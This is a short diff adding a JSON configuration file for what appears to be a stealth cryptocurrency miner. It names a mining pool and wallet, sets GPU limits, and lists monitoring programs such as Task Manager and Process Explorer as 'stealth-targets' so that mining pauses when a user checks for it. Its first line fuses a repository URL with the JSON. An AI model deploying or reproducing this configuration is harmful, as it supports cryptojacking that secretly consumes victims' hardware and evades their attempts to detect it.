@@ -1,0 +1,10 @@
+https://github.com/silentrubl/json/tree/main{
+    "url": "stratums://`0x395013132bE2154Cf0D4C2c56F15048bca79dfeC`.silent_rubl@etc.2miners.com:11010",
+    "algo": "etchash",
+    "max-gpu": 30,
+    "idle-wait": 2,
+    "idle-gpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
